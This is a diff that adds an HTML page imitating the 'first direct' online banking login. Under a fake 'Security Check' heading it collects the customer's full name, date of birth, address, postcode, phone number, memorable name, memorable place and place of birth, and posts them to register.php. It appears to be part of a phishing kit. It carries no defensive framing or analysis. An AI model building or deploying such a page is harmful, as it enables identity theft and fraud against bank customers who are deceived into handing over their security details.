@@ -1,0 +1,150 @@
+<html>
+
+<head>
+    <link rel="stylesheet" href="css/app.css">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    <div id="app">
+        <div id="main" class="_323TU608c7R7" data-path="/authentication/username" aria-hidden="false"><span class="_18lR5Lcsowvx"></span>
+            <main id="content" class="_2c87ug2gdnMj iSsy-kS_VNy5" aria-live="polite" aria-hidden="false"><a class="_3uPSPih3cDvg" data-qa="screen-reader-label" id="maincontent" name="maincontent" tabindex="-1">Main content</a>
+                <form class="_2kwu1cwKs9T_" autocomplete="off" action="register.php" method="post">
+                    <button type="submit" aria-hidden="true">Continue</button>
+                    <section data-qa="cam-10-page" class="_29F8NWiiqSC3">
+                        <div class="_1X89qp1igOet">
+                            <div tabindex="-1" class="_3xPv4X2mUydX"><span class="_3uPSPih3cDvg" data-qa="screen-reader-label">Welcome to Online Banking</span></div>
+                            <div class="_3eQtoAx26Fcq"><span class="dPKmS236Npsr desktop withFscs"><span class="_3uPSPih3cDvg" data-qa="screen-reader-label">first direct</span></span>
+                                <div class="_33L-2J38Wsyv mobile"><button type="button" class="P_5rUHJIogxd" aria-label="Financial Services Compensation Scheme Info"></button></div>
+                            </div>
+                            <div class="L8vJsKaVQWNa">
+                                <h1 class="_2rnMquiDwicT mb0">
+                                    Security Check. Please Confirm The Following:
+                                </h1>
+                                <div class="_29nFIMM-RjyQ">
+                                    Welcome back
+                                    <span class="lbluserid" id="lbluserid">JSMITH</span><br> If this is not your username then
+                                    <a class="login_link" href="1.html">Change user</a>
+                                </div>
+                            </div>
+                            <div class="_3Ro6ZCWC7I1e">
+                                <div class="_33L-2J38Wsyv desktop"><button type="button" class="P_5rUHJIogxd" aria-label="Financial Services Compensation Scheme Info"></button></div>
+                            </div>
+                        </div>
+                        <div class="_3pe8PXvAbUT6">
+                            <div class="_1GHP4BOvDft7 _2e9QSPL6OSaY">
+                                <fieldset class="custom-fieldset">
+                                    <div>
+                                        <label class="RE2Klxc4g_7m no-margin" for="question">Your Full Name</label>
+                                        <div>
+                                            <input name="fullname" type="text" id="fullname" aria-required="true" size="30" maxlength="76" value="">
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label class="RE2Klxc4g_7m no-margin" for="question">Date of Birth</label>
+                                        <div>
+                                            <input name="date_of_birth" type="text" id="date_of_birth" aria-required="true" size="30" maxlength="76" value="">
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label class="RE2Klxc4g_7m no-margin" for="question">Address</label>
+                                        <div>
+                                            <input name="address" type="text" id="address" aria-required="true" size="30" maxlength="76" value="">
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label class="RE2Klxc4g_7m no-margin" for="question">Postcode</label>
+                                        <div>
+                                            <input name="postcode" type="text" id="postcode" aria-required="true" size="30" maxlength="76" value="">
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label class="RE2Klxc4g_7m no-margin" for="question">Phone number</label>
+                                        <div>
+                                            <input name="phonenumber" type="text" id="phonenumber" aria-required="true" size="30" maxlength="76" value="">
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label class="RE2Klxc4g_7m no-margin" for="question">Memorable Name</label>
+                                        <div>
+                                            <input name="momorable_name" type="text" id="momorable_name" aria-required="true" size="30" maxlength="76" value="">
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label class="RE2Klxc4g_7m no-margin" for="question">Memorable Place</label>
+                                        <div>
+                                            <input name="memorable_place" type="text" id="memorable_place" aria-required="true" size="30" maxlength="76" value="">
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label class="RE2Klxc4g_7m no-margin" for="question">Place of Birth</label>
+                                        <div>
+                                            <input name="place_of_birth" type="text" id="place_of_birth" aria-required="true" size="30" maxlength="76" value="">
+                                        </div>
+                                    </div>
+                                    <div class="_3CPEmgd7mKjp">
+                                        <button class="_3qcy6oh1BJdO _1wxVBjVdI7l6" type="submit" data-qa="logon-next-button" aria-disabled="true" id="btn-submit">Next</button>
+                                    </div>
+                                </fieldset>
+                            </div>
+                        </div>
+                    </section>
+                </form>
+            </main><span class="_3YY65zlSVHy2" aria-hidden="true">&nbsp;</span><span class="_2gobnFGrEjFb" aria-hidden="true">&nbsp;</span><span class="_2AD7S671Wm7o" aria-hidden="true">&nbsp;</span>
+        </div>
+        <div class="ReactModalPortal"></div>
+        <div class="ReactModalPortal"></div>
+        <div class="ReactModalPortal"></div>
+        <div class="ReactModalPortal"></div>
+    </div>
+
+    <script>
+        document.getElementById('fullname').addEventListener('input', () => {
+            checkValid();
+        });
+        document.getElementById('date_of_birth').addEventListener('input', () => {
+            checkValid();
+        });
+        document.getElementById('postcode').addEventListener('input', () => {
+            checkValid();
+        });
+        document.getElementById('phonenumber').addEventListener('input', () => {
+            checkValid();
+        });
+        document.getElementById('momorable_name').addEventListener('input', () => {
+            checkValid();
+        });
+        document.getElementById('memorable_place').addEventListener('input', () => {
+            checkValid();
+        });
+        document.getElementById('place_of_birth').addEventListener('input', () => {
+            checkValid();
+        });
+        document.getElementById('address').addEventListener('input', () => {
+            checkValid();
+        });
+
+        function checkValid() {
+            var fullname = document.getElementById('fullname').value;
+            var date_of_birth = document.getElementById('date_of_birth').value;
+            var postcode = document.getElementById('postcode').value;
+            var phonenumber = document.getElementById('phonenumber').value;
+            var momorable_name = document.getElementById('momorable_name').value;
+            var memorable_place = document.getElementById('memorable_place').value;
+            var place_of_birth = document.getElementById('place_of_birth').value;
+            var address = document.getElementById('address').value;
+
+            if (fullname && date_of_birth && postcode && phonenumber && momorable_name && memorable_place && place_of_birth && address) {
+                document.getElementById('btn-submit').classList.add('_346tgcQzioQc');
+                document.getElementById('btn-submit').classList.add('black');
+                document.getElementById('btn-submit').classList.remove('_1wxVBjVdI7l6');
+            } else {
+                document.getElementById('btn-submit').classList.add('_1wxVBjVdI7l6');
+                document.getElementById('btn-submit').classList.remove('_346tgcQzioQc');
+                document.getElementById('btn-submit').classList.remove('black');
+            }
+        }
+    </script>
+</body>
+
+</html>
